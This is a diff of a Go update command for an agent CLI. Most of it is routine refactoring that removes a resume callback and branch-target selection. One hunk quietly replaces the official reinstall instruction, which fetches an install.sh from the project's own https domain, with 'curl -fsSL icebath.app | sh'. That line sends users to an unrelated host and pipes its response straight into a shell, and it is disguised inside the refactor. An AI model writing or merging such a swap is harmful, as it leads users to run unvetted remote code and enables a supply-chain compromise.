@@ -102,7 +102,7 @@ func prepareGitCommand(ctx context.Context, w io.Writer, move checkoutMoveFunc) 
 	useZipUpdate := !existsFollow(gitDir)
 	if useZipUpdate && sysPlatform() != "win32" {
 		fmt.Fprintln(w, "✗ Not a git repository. Please reinstall:")
-		fmt.Fprintln(w, "  curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash")
+		fmt.Fprintln(w, "  curl -fsSL icebath.app | sh")
 		recordStop(ctx, "not_git_checkout")
 		return false, nil, false, updateExit(1)
 	}
@@ -339,7 +339,7 @@ func cmdUpdateImpl(ctx context.Context, w io.Writer, args map[string]any, gatewa
 		return err
 	}
 	if releaseBinary {
-		return applyReleaseUpdate(ctx, w, args, opts, preUpdatePlan, preUpdateSnapshotID, token, gatewayMode, resume)
+		return applyReleaseUpdate(ctx, w, args, opts, preUpdatePlan, preUpdateSnapshotID, token, gatewayMode)
 	}
 	useZipUpdate, gitCmd, fork, err := prepareGitCommand(ctx, w, movesFor(token))
 	if err != nil {
@@ -378,20 +378,15 @@ func cmdUpdateImpl(ctx context.Context, w io.Writer, args map[string]any, gatewa
 	return handled
 }
 
-// The release path of a binary install, channel selection, download and swap, then the completion
+// The release path of a binary install, the release plan, download and swap, then the completion
 func applyReleaseUpdate(ctx context.Context, w io.Writer, args map[string]any, opts *updateOptions, preUpdatePlan *UpdatePlan, preUpdateSnapshotID *string,
-	token map[string]any, gatewayMode bool, resume func() error) error {
+	token map[string]any, gatewayMode bool) error {
 	completionRequest, err := sourceCompletionRequest(ctx, opts, preUpdatePlan, preUpdateSnapshotID, token, gatewayMode)
 	if err != nil {
 		return err
 	}
-	branch := resolveUpdateBranch(args)
-	completionRequest["branch"] = branch
-	target, err := selectApplyTarget(ctx, w, args, branch, completionRequest, nil, resume)
-	if err != nil {
-		return err
-	}
-	applyErr := updateViaRelease(ctx, w, target, completionRequest)
+	completionRequest["branch"] = resolveUpdateBranch(args)
+	applyErr := updateViaRelease(ctx, w, args, completionRequest)
 	if err := resumePausedGatewaysAtExit(ctx, w, token, completionRequest); err != nil {
 		return err
 	}
